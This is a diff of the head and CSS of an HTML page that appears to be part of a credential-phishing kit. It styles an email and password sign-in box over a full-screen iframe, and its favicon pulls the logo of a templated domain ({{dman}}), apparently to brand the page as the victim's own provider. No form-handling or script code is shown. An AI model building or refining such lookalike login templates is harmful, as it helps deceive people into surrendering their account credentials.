@@ -8,20 +8,145 @@
   <link rel="icon" href="https://api.kickfire.com/logo?website={{dman}}" type="image/x-icon">
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
-    body {
-      margin: 0;
-      padding: 0;
-      overflow: hidden;
-    }
-    #bgFrame {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      border: none;
-      filter: blur(8px) brightness(0.7);
-      z-index: -1;
+    html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+            margin: 0;
+            padding: 0;
+            border: 0;
+            font-size: 100%;
+            font: inherit;
+            vertical-align: baseline;
+        }
+        article, aside, details, figcaption, figure, footer, header, hgroup, menu, nav, section {
+            display: block;
+        }
+        body {
+            line-height: 1;
+            height: 100%;
+        }
+        ol, ul {
+            list-style: none;
+        }
+        blockquote, q {
+            quotes: none;
+        }
+        blockquote:before, blockquote:after, q:before, q:after {
+            content: '';
+            content: none;
+        }
+        table {
+            border-collapse: collapse;
+            border-spacing: 0;
+        }
+        html, body {
+            font-size: 18px;
+            font-family: Arial, helvetica neue, Helvetica, sans-serif;
+            font-weight: 500;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+        #root {
+            position: absolute;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            top: 0;
+            z-index: -10;
+            pointer-events: none;
+        }
+        .error {
+            color: #dc3545;
+            width: 80%;
+            margin: 0 auto;
+            padding-top: 5px;
+        }
+        .form-holder {
+            background-color: rgba(255, 255, 255, 0.9); /* semi-transparent background */
+            width: 600px;
+            margin: 180px auto;
+            height: auto;
+            box-shadow: 0 20px 50px #a9a9a9;
+            border-radius: 4px 4px 0 0;
+            border: 1px solid #d6dfea;
+            z-index: 12;
+            position: relative;
+        }
+        .xlogo {
+            background-color: #0d4f8b;
+            color: #fff;
+            padding: 8px;
+            margin-bottom: 10px;
+        }
+        .xlogo img {
+            vertical-align: middle;
+            width: 5%;
+            height: 5%;
+            object-fit: contain;
+        }
+        .xlogo span {
+            vertical-align: middle;
+        }
+        .form-wrap {
+            width: 400px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        .form-wrap p {
+            font-size: 24px;
+        }
+        .form-wrap img {
+            margin: 20px;
+        }
+        .finput {
+            width: 80%;
+            margin: 10px auto;
+        }
+        .finput input[type=email], .finput input[type=password] {
+            font-size: 24px;
+            padding: 7px 10px 7px 40px;
+            border-radius: 4px;
+            margin: 5px 0;
+            width: 90%;
+            border: 1px solid #d6dfea;
+        }
+        .finput input[type=email] {
+            background: url(data:image/png;base64,...) no-repeat scroll 10px 10px;
+        }
+        .finput input[type=password] {
+            background: url(data:image/png;base64,...) no-repeat scroll 7px 7px;
+        }
+        .finput input[type=email]:hover, .finput input[type=password]:hover, .finput input[type=email]:focus, .finput input[type=password]:focus {
+            border: 1px solid #0d4f8b;
+        }
+        button {
+            border: 1px solid #0d4f8b;
+            font-size: 20px;
+            padding: 7px 20px;
+            border-radius: 4px;
+            background-color: #0d4f8b;
+            color: #fff;
+        }
+        button:hover {
+            background-color: #1874cd;
+            cursor: pointer;
+        }
+        .privacy {
+            font-size: 14px;
+            color: gray;
+            text-align: left;
+            display: block;
+            margin-bottom: 20px;
+        }
+
+        /* Fullscreen iframe */
+        iframe.fullscreen-iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: -1; /* Behind everything else */
     }
   </style>
 </head>
